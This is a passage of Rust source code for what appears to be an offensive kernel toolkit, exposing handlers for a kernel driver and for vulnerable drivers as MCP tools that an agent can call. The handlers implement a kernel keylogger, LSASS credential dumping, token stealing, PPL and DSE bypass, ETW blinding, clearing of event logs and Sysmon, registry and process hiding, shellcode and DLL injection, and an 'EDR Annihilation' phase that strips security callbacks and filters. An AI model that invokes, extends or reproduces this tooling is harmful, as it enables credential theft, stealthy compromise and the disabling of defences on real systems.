        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .unloaded_drv_clear(action_code, driver_name)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "unloaded_drivers_clear",
        "action": action,
        "entries_cleared": r.entries_cleared,
        "total_entries": r.total_entries,
        "mm_unloaded_drivers": format!("0x{:016X}", r.mm_unloaded_drivers_addr),
    }))
}

fn driver_token_swap(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("swap_action")
        .and_then(|v| v.as_str())
        .unwrap_or("steal");
    let action_code = match action {
        "steal" => TOKEN_SWAP_STEAL,
        "swap" => TOKEN_SWAP_SWAP,
        "query" => TOKEN_SWAP_QUERY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_token_swap",
                "swap_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_token_swap")?;
    let args = &normalized_args;
    let target_pid = parse_u64_arg(args.get("target_pid")).unwrap_or(0) as u32;
    let source_pid = parse_u64_arg(args.get("source_pid")).unwrap_or(0) as u32;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .token_swap(action_code, target_pid, source_pid)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "token_swap",
        "action": action,
        "target_pid": r.target_pid,
        "old_token": format!("0x{:016X}", r.old_token),
        "new_token": format!("0x{:016X}", r.new_token),
        "eprocess": format!("0x{:016X}", r.eprocess_addr),
    }))
}

fn driver_process_protect(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("protect_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "set" => PROTECT_SET,
        "strip" => PROTECT_STRIP,
        "query" => PROTECT_QUERY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_process_protect",
                "protect_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_process_protect")?;
    let args = &normalized_args;
    let pid = parse_u64_arg(args.get("pid")).unwrap_or(0) as u32;
    let signer_type = parse_u64_arg(args.get("signer_type")).unwrap_or(0) as u8;
    let signer_audit = parse_u64_arg(args.get("signer_audit")).unwrap_or(0) as u8;
    let signer_level = parse_u64_arg(args.get("signer_level")).unwrap_or(0) as u8;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .process_protect(action_code, pid, signer_type, signer_audit, signer_level)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "process_protect",
        "action": action,
        "pid": r.process_id,
        "eprocess": format!("0x{:016X}", r.eprocess_addr),
        "old_protection": format!("0x{:02X}", r.old_protection),
        "new_protection": format!("0x{:02X}", r.new_protection),
        "old_signer_type": r.old_signer_type,
        "old_signer_audit": r.old_signer_audit,
    }))
}

// === Phase 13 MCP tools ===

fn driver_keylogger(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let normalized_args = normalized_kernel_registry_args(args, "driver_keylogger")?;
    let action = normalized_args
        .get("keylog_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "start" => KEYLOG_START,
        "stop" => KEYLOG_STOP,
        "read" => KEYLOG_READ,
        "query" => KEYLOG_QUERY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_keylogger",
                "keylog_action",
                action,
            ))
        }
    };
    let max_keys = optional_bounded_u64_param(
        &normalized_args,
        "max_keys",
        "kernel",
        "driver_keylogger",
        512,
    )? as u32;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .keylogger(action_code, max_keys)
        .map_err(|e| e.to_string())?;
    let keys: Vec<String> = r.keys[..r.key_count as usize]
        .iter()
        .map(|&k| format!("0x{:04X}", k))
        .collect();
    Ok(json!({
        "success": r.success == 1,
        "technique": "kernel_keylogger",
        "action": action,
        "active": r.active == 1,
        "key_count": r.key_count,
        "keys": keys,
    }))
}

fn driver_reg_hide(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("reg_action")
        .and_then(|v| v.as_str())
        .unwrap_or("list");
    let action_code = match action {
        "add" => REG_HIDE_ADD,
        "remove" => REG_HIDE_REMOVE,
        "clear" => REG_HIDE_CLEAR,
        "list" => REG_HIDE_LIST,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_reg_hide",
                "reg_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_reg_hide")?;
    let args = &normalized_args;
    let hide_type = parse_u64_arg(args.get("hide_type")).unwrap_or(0) as u32;
    let key_path = args.get("key_path").and_then(|v| v.as_str()).unwrap_or("");
    let value_name = args.get("value_name").and_then(|v| v.as_str());
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .reg_hide(action_code, hide_type, key_path, value_name)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "registry_hiding",
        "action": action,
        "hidden_count": r.hidden_count,
        "total_hidden": r.total_hidden,
    }))
}

fn driver_file_lock(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("lock_action")
        .and_then(|v| v.as_str())
        .unwrap_or("list");
    let action_code = match action {
        "add" => FILE_LOCK_ADD,
        "remove" => FILE_LOCK_REMOVE,
        "clear" => FILE_LOCK_CLEAR,
        "list" => FILE_LOCK_LIST,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_file_lock",
                "lock_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_file_lock")?;
    let args = &normalized_args;
    let protect_flags = parse_u64_arg(args.get("protect_flags")).unwrap_or(7) as u32;
    let path = args.get("file_path").and_then(|v| v.as_str()).unwrap_or("");
    let allowed_pid = parse_u64_arg(args.get("allowed_pid")).unwrap_or(0) as u32;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .file_lock(action_code, protect_flags, path, allowed_pid)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "file_protection",
        "action": action,
        "locked_count": r.locked_count,
        "total_locked": r.total_locked,
    }))
}

fn driver_etw_blind(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("etw_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "disable" => ETW_BLIND_DISABLE,
        "enable" => ETW_BLIND_ENABLE,
        "kill_all" => ETW_BLIND_KILL_ALL,
        "query" => ETW_BLIND_QUERY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_etw_blind",
                "etw_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_etw_blind")?;
    let args = &normalized_args;
    let guid_str = args
        .get("provider_guid")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let mut guid_bytes = [0u8; 16];
    // Parse GUID string like "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"
    let hex: String = guid_str.replace('-', "");
    if hex.len() == 32 {
        for i in 0..16 {
            guid_bytes[i] = u8::from_str_radix(&hex[i * 2..i * 2 + 2], 16).unwrap_or(0);
        }
    }
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .etw_blind(action_code, &guid_bytes)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "etw_provider_blinding",
        "action": action,
        "providers_affected": r.providers_affected,
        "provider_addr": format!("0x{:016X}", r.provider_addr),
        "old_enable_info": format!("0x{:016X}", r.old_enable_info),
    }))
}

fn driver_eprocess_spoof(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("spoof_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "image_name" => SPOOF_IMAGE_NAME,
        "command_line" => SPOOF_COMMAND_LINE,
        "pid" => SPOOF_PID,
        "query" => SPOOF_QUERY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_eprocess_spoof",
                "spoof_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_eprocess_spoof")?;
    let args = &normalized_args;
    let pid = parse_u64_arg(args.get("pid")).unwrap_or(0) as u32;
    let new_name = args.get("new_image_name").and_then(|v| v.as_str());
    let new_cmd = args.get("new_command_line").and_then(|v| v.as_str());
    let new_ppid = parse_u64_arg(args.get("new_parent_pid")).unwrap_or(0) as u32;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .eprocess_spoof(action_code, pid, new_name, new_cmd, new_ppid)
        .map_err(|e| e.to_string())?;
    let old_name = String::from_utf8_lossy(&r.old_image_name)
        .trim_end_matches('\0')
        .to_string();
    Ok(json!({
        "success": r.success == 1,
        "technique": "eprocess_spoofing",
        "action": action,
        "pid": r.process_id,
        "eprocess": format!("0x{:016X}", r.eprocess_addr),
        "old_image_name": old_name,
        "old_parent_pid": r.old_parent_pid,
    }))
}

fn driver_event_log_clear(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let normalized_args = normalized_kernel_registry_args(args, "driver_event_log_clear")?;
    let action = normalized_args
        .get("log_action")
        .and_then(|v| v.as_str())
        .unwrap_or("clear_all");
    let action_code = match action {
        "clear_all" => EVTLOG_CLEAR_ALL,
        "clear_security" => EVTLOG_CLEAR_SECURITY,
        "clear_system" => EVTLOG_CLEAR_SYSTEM,
        "clear_sysmon" => EVTLOG_CLEAR_SYSMON,
        "kill_service" => EVTLOG_KILL_SERVICE,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_event_log_clear",
                "log_action",
                action,
            ))
        }
    };
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let log_name = normalized_args.get("log_name").and_then(|v| v.as_str());
    let r = drv
        .event_log_clear(action_code, log_name)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "event_log_tampering",
        "action": action,
        "threads_killed": r.threads_killed,
        "files_deleted": r.files_deleted,
        "svchost_pid": r.svchost_pid,
    }))
}

fn driver_cred_dump(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("cred_action")
        .and_then(|v| v.as_str())
        .unwrap_or("find_lsass");
    let action_code = match action {
        "find_lsass" => CRED_FIND_LSASS,
        "read" => CRED_READ_MEMORY,
        "dump" => CRED_DUMP_FULL,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_cred_dump",
                "cred_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_cred_dump")?;
    let args = &normalized_args;
    let pid = parse_u64_arg(args.get("pid")).unwrap_or(0) as u32;
    let address = parse_address_arg(args.get("address")).unwrap_or(0);
    let size = optional_bounded_u64_param(args, "size", "kernel", "driver_cred_dump", 4096)? as u32;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let output = drv
        .cred_dump(action_code, pid, address, size)
        .map_err(|e| e.to_string())?;
    if output.len() < std::mem::size_of::<CredDumpResponse>() {
        return Err("Incomplete cred dump response".to_string());
    }
    let resp: CredDumpResponse = unsafe { *(output.as_ptr() as *const CredDumpResponse) };
    let data_start = std::mem::size_of::<CredDumpResponse>();
    let data = if output.len() > data_start {
        &output[data_start..]
    } else {
        &[]
    };
    let hex_data: String = data
        .iter()
        .take(256)
        .map(|b| format!("{:02X}", b))
        .collect();
    Ok(json!({
        "success": resp.success == 1,
        "technique": "kernel_credential_dump",
        "action": action,
        "pid": resp.process_id,
        "eprocess": format!("0x{:016X}", resp.eprocess_addr),
        "bytes_read": resp.bytes_read,
        "data_preview": hex_data,
    }))
}

fn driver_driver_impersonate(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("imp_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match action {
        "swap" => IMPERSONATE_SWAP,
        "restore" => IMPERSONATE_RESTORE,
        "query" => IMPERSONATE_QUERY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_impersonate",
                "imp_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_impersonate")?;
    let args = &normalized_args;
    let target = args
        .get("target_path")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let legit = args
        .get("legit_path")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .driver_impersonate(action_code, target, legit)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "driver_impersonation",
        "action": action,
        "bytes_written": r.bytes_written,
        "nt_status": format!("0x{:08X}", r.nt_status),
    }))
}

// ── Phase 14: EDR Annihilation MCP Tools ──

fn driver_callback_nuke(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("cb_action")
        .and_then(|v| v.as_str())
        .unwrap_or("enum");
    let action_code = match action {
        "enum" => CBNUKE_ENUM,
        "remove" => CBNUKE_REMOVE,
        "nuke_all" => CBNUKE_NUKE_ALL,
        "restore" => CBNUKE_RESTORE,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_callback_nuke",
                "cb_action",
                action,
            ))
        }
    };
    let cb_type = args
        .get("cb_type")
        .and_then(|v| v.as_str())
        .unwrap_or("process");
    let cb_type_code = match cb_type {
        "process" => CB_TYPE_PROCESS,
        "thread" => CB_TYPE_THREAD,
        "image" => CB_TYPE_IMAGE,
        "object" => CB_TYPE_OBJECT,
        "registry" => CB_TYPE_REGISTRY,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_callback_nuke",
                "cb_type",
                cb_type,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_callback_nuke")?;
    let args = &normalized_args;
    let index = parse_u64_arg(args.get("index")).unwrap_or(0) as u32;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .callback_nuke(action_code, cb_type_code, index)
        .map_err(|e| e.to_string())?;
    let mut entries_json = Vec::new();
    for i in 0..r.total_callbacks.min(64) as usize {
        let e = &r.entries[i];
        if e.address == 0 {
            continue;
        }
        let name = String::from_utf8_lossy(&e.module_name)
            .trim_end_matches('\0')
            .to_string();
        entries_json.push(json!({
            "index": i,
            "address": format!("0x{:016X}", e.address),
            "module_base": format!("0x{:016X}", e.module_base),
            "module_name": name,
            "type": e.cb_type,
            "active": e.active == 1,
        }));
    }
    Ok(json!({
        "success": r.success == 1,
        "technique": "callback_nuke",
        "action": action,
        "callback_type": cb_type,
        "total_callbacks": r.total_callbacks,
        "removed_count": r.removed_count,
        "entries": entries_json,
    }))
}

fn driver_minifilter_detach(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("mf_action")
        .and_then(|v| v.as_str())
        .unwrap_or("enum");
    let action_code = match action {
        "enum" => MINIFILTER_DETACH_ENUM,
        "detach" => MINIFILTER_DETACH_ONE,
        "nuke" => MINIFILTER_DETACH_NUKE,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_minifilter_detach",
                "mf_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_minifilter_detach")?;
    let args = &normalized_args;
    let filter_name = args
        .get("filter_name")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let frame_id = parse_u64_arg(args.get("frame_id")).unwrap_or(0) as u32;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .minifilter_detach(action_code, filter_name, frame_id)
        .map_err(|e| e.to_string())?;
    let mut entries_json = Vec::new();
    for i in 0..r.total_filters.min(32) as usize {
        let e = &r.entries[i];
        if e.filter_addr == 0 {
            continue;
        }
        let name = String::from_utf16_lossy(&e.filter_name)
            .trim_end_matches('\0')
            .to_string();
        entries_json.push(json!({
            "index": i,
            "filter_name": name,
            "frame_id": e.frame_id,
            "num_instances": e.num_instances,
            "filter_addr": format!("0x{:016X}", e.filter_addr),
        }));
    }
    Ok(json!({
        "success": r.success == 1,
        "technique": "minifilter_detach",
        "action": action,
        "total_filters": r.total_filters,
        "detached_count": r.detached_count,
        "entries": entries_json,
    }))
}

fn driver_kernel_apc(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("apc_action")
        .and_then(|v| v.as_str())
        .unwrap_or("inject");
    let action_code = match action {
        "inject" => KAPC_INJECT,
        "dll" => KAPC_DLL,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_kernel_apc",
                "apc_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_kernel_apc")?;
    let args = &normalized_args;
    let pid = require_u64_param(args, "pid", "kernel", "driver_kernel_apc")? as u32;
    let tid = parse_u64_arg(args.get("tid")).unwrap_or(0) as u32;
    let sc_size = parse_u64_arg(args.get("shellcode_size")).unwrap_or(0) as u32;
    let sc_addr = parse_address_arg(args.get("shellcode_addr")).unwrap_or(0);
    let dll_path = args.get("dll_path").and_then(|v| v.as_str()).unwrap_or("");
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .kernel_apc_inject(action_code, pid, tid, sc_size, sc_addr, dll_path)
        .map_err(|e| e.to_string())?;
    Ok(json!({
        "success": r.success == 1,
        "technique": "kernel_apc_inject",
        "action": action,
        "thread_id": r.thread_id,
        "apc_addr": format!("0x{:016X}", r.apc_addr),
        "nt_status": format!("0x{:08X}", r.nt_status),
    }))
}

fn driver_wfp_remove(args: &Value) -> Result<Value, String> {
    use crate::driver::*;
    let action = args
        .get("wfp_action")
        .and_then(|v| v.as_str())
        .unwrap_or("enum");
    let action_code = match action {
        "enum" => WFP_ENUM,
        "remove" => WFP_REMOVE_ONE,
        "nuke" => WFP_NUKE,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_wfp_remove",
                "wfp_action",
                action,
            ))
        }
    };
    let normalized_args = normalized_kernel_registry_args(args, "driver_wfp_remove")?;
    let args = &normalized_args;
    let callout_id = parse_u64_arg(args.get("callout_id")).unwrap_or(0);
    let provider = args
        .get("provider_name")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv
        .wfp_remove(action_code, callout_id, provider)
        .map_err(|e| e.to_string())?;
    let mut entries_json = Vec::new();
    for i in 0..r.total_callouts.min(32) as usize {
        let e = &r.entries[i];
        if e.callout_id == 0 && e.function_addr == 0 {
            continue;
        }
        let name = String::from_utf16_lossy(&e.provider_name)
            .trim_end_matches('\0')
            .to_string();
        entries_json.push(json!({
            "index": i,
            "callout_id": e.callout_id,
            "function_addr": format!("0x{:016X}", e.function_addr),
            "provider_name": name,
            "layer_id": e.layer_id,
            "active": e.active == 1,
        }));
    }
    Ok(json!({
        "success": r.success == 1,
        "technique": "wfp_remove",
        "action": action,
        "total_callouts": r.total_callouts,
        "removed_count": r.removed_count,
        "entries": entries_json,
    }))
}

pub(crate) fn handle_kernel(args: &Value) -> Result<Value, String> {
    let normalized = normalize_kernel_args(args);
    let args = &normalized;
    let action = require_typed_action(args, "kernel")?;
    let typed_action =
        KernelAction::try_from(&action).map_err(|_| kernel_action_help(action.as_str()))?;
    let action_name = typed_action.as_str();
    let memoric_available_before = if is_memoric_direct_kernel_action(action_name)
        || (is_hybrid_kernel_action(action_name)
            && args
                .get("device_path")
                .and_then(|v| v.as_str())
                .filter(|s| !s.is_empty())
                .is_none())
    {
        crate::driver::MemoricDriver::is_available()
    } else {
        false
    };
    let preflight = require_kernel_mutation_preflight(action_name, args)?;

    let result = match typed_action {
        KernelAction::Status => kernel_status(args),

        // Driver management
        KernelAction::DriverLoad => crate::kernel::load_driver(args).map_err(|e| e.to_string()),
        KernelAction::DriverUnload => crate::kernel::unload_driver(args).map_err(|e| e.to_string()),
        KernelAction::DriverDiscover => {
            crate::kernel::discover_vulnerable_drivers(args).map_err(|e| e.to_string())
        }
        KernelAction::DriverAuto => {
            crate::kernel::auto_load_driver(args).map_err(|e| e.to_string())
        }

        // Memory operations
        KernelAction::Read => {
            require_u64_param(args, "address", "kernel", "read")?;
            let physical = args
                .get("physical")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            if physical {
                crate::memory::read_physical_memory(args).map_err(|e| e.to_string())
            } else {
                crate::kernel::driver_read_memory(args).map_err(|e| e.to_string())
            }
        }
        KernelAction::Write => {
            require_str_param(
                args,
                "device_path",
                "kernel",
                "write",
                Some("Provide the BYOVD device path used for the write IOCTL."),
            )?;
            require_u32_param(args, "ioctl_code", "kernel", "write")?;
            require_u64_param(args, "address", "kernel", "write")?;
            require_byte_array_param(args, "bytes", "kernel", "write")?;
            crate::kernel::driver_write_memory(args).map_err(|e| e.to_string())
        }
        KernelAction::PhysicalRead => {
            let address = require_u64_param(args, "address", "kernel", "physical_read")?;
            let size =
                optional_bounded_u64_param(args, "size", "kernel", "physical_read", 8)? as usize;
            crate::bruteforce::physical_memory::read_physical_memory(address, size)
                .map(|data| json!({"success": true, "address": format!("0x{:016X}", address), "bytes_read": data.len(), "hex": hex::encode(&data)}))
                .map_err(|e| e.to_string())
        }
        KernelAction::PhysicalWrite => {
            let address = require_u64_param(args, "address", "kernel", "physical_write")?;
            let bytes = require_byte_array_param(args, "bytes", "kernel", "physical_write")?;
            crate::bruteforce::physical_memory::write_physical_memory(address, &bytes)
                .map(|written| json!({"success": true, "address": format!("0x{:016X}", address), "bytes_written": written}))
                .map_err(|e| e.to_string())
        }

        // PTE/VAD (from bruteforce, via BYOVD)
        KernelAction::PteModify => {
            require_str_param(
                args,
                "device_path",
                "kernel",
                "pte_modify",
                Some("Provide the BYOVD device path, e.g. device_path='\\\\.\\RTCore64'."),
            )?;
            require_u32_param(args, "read_ioctl", "kernel", "pte_modify")?;
            require_u32_param(args, "write_ioctl", "kernel", "pte_modify")?;
            require_u64_param(args, "address", "kernel", "pte_modify")?;
            require_u64_param(args, "cr3", "kernel", "pte_modify")?;
            pte_modify_via_driver(args)
        }
        KernelAction::VadHide => {
            require_u32_param(args, "pid", "kernel", "vad_hide")?;
            require_u64_param(args, "address", "kernel", "vad_hide")?;
            require_str_param(
                args,
                "device_path",
                "kernel",
                "vad_hide",
                Some("Provide the BYOVD device path used for VAD tree reads/writes."),
            )?;
            require_u32_param(args, "read_ioctl", "kernel", "vad_hide")?;
            require_u32_param(args, "write_ioctl", "kernel", "vad_hide")?;
            vad_hide_via_driver(args)
        }

        // Sniffing (from bruteforce)
        KernelAction::SniffStart => {
            let pid = require_u32_param(args, "pid", "kernel", "sniff_start")?;
            let config = crate::bruteforce::sniffing::SniffingConfig {
                target_pid: pid,
                address_ranges: vec![],
                mode: crate::bruteforce::sniffing::SniffMode::All,
                callback_id: format!("sniff_{}", pid),
            };
            crate::bruteforce::sniffing::start_sniffing(config).map_err(|e| e.to_string())
        }
        KernelAction::SniffStop => {
            crate::bruteforce::sniffing::stop_all_sniffing().map_err(|e| e.to_string())
        }

        // Kernel operations
        KernelAction::EnumCallbacks => {
            require_str_param(
                args,
                "device_path",
                "kernel",
                "enum_callbacks",
                Some("Provide the BYOVD device path used for kernel callback reads."),
            )?;
            require_u32_param(args, "ioctl_read_code", "kernel", "enum_callbacks")?;
            crate::kernel::enum_kernel_callbacks(args).map_err(|e| e.to_string())
        }
        KernelAction::RemoveCallback => {
            require_str_param(
                args,
                "device_path",
                "kernel",
                "remove_callback",
                Some("Provide the BYOVD device path used for kernel callback writes."),
            )?;
            require_u32_param(args, "ioctl_write_code", "kernel", "remove_callback")?;
            require_u64_param(args, "callback_index", "kernel", "remove_callback")?;
            require_u64_param(args, "array_address", "kernel", "remove_callback")?;
            crate::kernel::remove_kernel_callback(args).map_err(|e| e.to_string())
        }
        KernelAction::ObjectCallbackEnum => {
            require_str_param(
                args,
                "device_path",
                "kernel",
                "object_callback_enum",
                Some("Provide the BYOVD device path used for object callback reads."),
            )?;
            require_u32_param(args, "read_ioctl", "kernel", "object_callback_enum")?;
            crate::kernel::object_callback_enum(args).map_err(|e| e.to_string())
        }
        KernelAction::ObjectCallbackRemove => {
            require_str_param(
                args,
                "device_path",
                "kernel",
                "object_callback_remove",
                Some("Provide the BYOVD device path used for object callback writes."),
            )?;
            require_u32_param(args, "write_ioctl", "kernel", "object_callback_remove")?;
            require_u64_param(args, "entry_address", "kernel", "object_callback_remove")?;
            crate::kernel::object_callback_remove(args).map_err(|e| e.to_string())
        }
        KernelAction::RegistryCallbackEnum => {
            require_str_param(
                args,
                "device_path",
                "kernel",
                "registry_callback_enum",
                Some("Provide the BYOVD device path used for registry callback reads."),
            )?;
            require_u32_param(args, "read_ioctl", "kernel", "registry_callback_enum")?;
            crate::kernel::registry_callback_enum(args).map_err(|e| e.to_string())
        }
        KernelAction::RegistryCallbackRemove => {
            require_str_param(
                args,
                "device_path",
                "kernel",
                "registry_callback_remove",
                Some("Provide the BYOVD device path used for registry callback writes."),
            )?;
            require_u32_param(args, "write_ioctl", "kernel", "registry_callback_remove")?;
            require_u64_param(args, "entry_address", "kernel", "registry_callback_remove")?;
            crate::kernel::registry_callback_remove(args).map_err(|e| e.to_string())
        }
        KernelAction::DriverNotifyRoutine => driver_notify_routine(args),
        KernelAction::DriverRegProtect => driver_reg_protect(args),
        KernelAction::DriverObjectHook => driver_object_hook(args),
        KernelAction::DriverPortHide => driver_port_hide(args),
        KernelAction::PplBypass => memoric_driver_or_byovd(args, "ppl_bypass"),
        KernelAction::DseBypass => crate::kernel::dse_bypass(args).map_err(|e| e.to_string()),
        KernelAction::DseMapDriver => {
            crate::kernel::dse_map_driver(args).map_err(|e| e.to_string())
        }
        KernelAction::DkomHide => memoric_driver_or_byovd(args, "dkom_hide"),
        KernelAction::ModuleHide => {
            crate::kernel::kernel_module_hide(args).map_err(|e| e.to_string())
        }
        KernelAction::MinifilterEnum => {
            crate::kernel::minifilter_enum(args).map_err(|e| e.to_string())
        }
        KernelAction::MinifilterRemove => {
            crate::kernel::minifilter_remove(args).map_err(|e| e.to_string())
        }
        KernelAction::TokenEscalate => memoric_driver_or_byovd(args, "token_escalate"),
        KernelAction::EtwTiRemove => crate::kernel::etw_ti_remove(args).map_err(|e| e.to_string()),

        // Native driver IOCTLs (memoric.sys direct)
        KernelAction::DriverEnumProcess => driver_enum_process(args),
        KernelAction::DriverModuleHide => driver_module_hide(args),
        KernelAction::DriverThreadHide => driver_thread_hide(args),
        KernelAction::DriverCallbackEnum => driver_callback_enum(args),
        KernelAction::DriverCallbackRemove => driver_callback_remove(args),
        KernelAction::DriverPatchKernel => driver_patch_kernel(args),
        KernelAction::DriverApcInject => driver_apc_inject(args),
        KernelAction::DriverHandleStrip => driver_handle_strip(args),
        KernelAction::DriverPeDump => driver_pe_dump(args),
        KernelAction::DriverSetDebugPort => driver_set_debug_port(args),
        KernelAction::DriverDpcTimer => driver_dpc_timer(args),
        KernelAction::DriverTokenDup => driver_token_dup(args),
        KernelAction::DriverStats => driver_stats(args),
        KernelAction::DriverMemoryPool => driver_memory_pool(args),
        KernelAction::DriverMinifilterEnum => driver_minifilter_enum(args),
        KernelAction::DriverProcessDump => driver_process_dump(args),
        KernelAction::DriverHypervisorDetect => driver_hypervisor_detect(args),
        KernelAction::DriverTestsignHide => driver_testsign_hide(args),
        KernelAction::DriverGlobalHook => driver_global_hook(args),
        KernelAction::DriverAutoInject => driver_auto_inject(args),
        KernelAction::DriverInfinityHook => driver_infinity_hook(args),
        KernelAction::DriverCiCallbackPatch => driver_ci_callback_patch(args),
        KernelAction::DriverCiFuncPatch => driver_ci_func_patch(args),
        KernelAction::DriverPteRw => driver_pte_rw(args),
        KernelAction::DriverMsrRw => driver_msr_rw(args),
        KernelAction::DriverCloak => driver_cloak(args),
        KernelAction::DriverForceKill => driver_force_kill(args),
        KernelAction::DriverForceDelete => driver_force_delete(args),
        KernelAction::DriverSystemThread => driver_system_thread(args),
        KernelAction::DriverKernelExec => driver_kernel_exec(args),
        // Phase 12 remaining
        KernelAction::DriverPplBypass => driver_ppl_bypass(args),
        KernelAction::DriverCrRw => driver_cr_rw(args),
        KernelAction::DriverIdtRw => driver_idt_rw(args),
        KernelAction::DriverUnloadedDrvClear => driver_unloaded_drv_clear(args),
        KernelAction::DriverTokenSwap => driver_token_swap(args),
        KernelAction::DriverProcessProtect => driver_process_protect(args),
        // Phase 13
        KernelAction::DriverKeylogger => driver_keylogger(args),
        KernelAction::DriverRegHide => driver_reg_hide(args),
        KernelAction::DriverFileLock => driver_file_lock(args),
        KernelAction::DriverEtwBlind => driver_etw_blind(args),
        KernelAction::DriverEprocessSpoof => driver_eprocess_spoof(args),
        KernelAction::DriverEventLogClear => driver_event_log_clear(args),
        KernelAction::DriverCredDump => driver_cred_dump(args),
        KernelAction::DriverImpersonate => driver_driver_impersonate(args),
        // Phase 14: EDR Annihilation
        KernelAction::DriverCallbackNuke => driver_callback_nuke(args),
        KernelAction::DriverMinifilterDetach => driver_minifilter_detach(args),
        KernelAction::DriverKernelApc => driver_kernel_apc(args),
        KernelAction::DriverWfpRemove => driver_wfp_remove(args),
    }?;

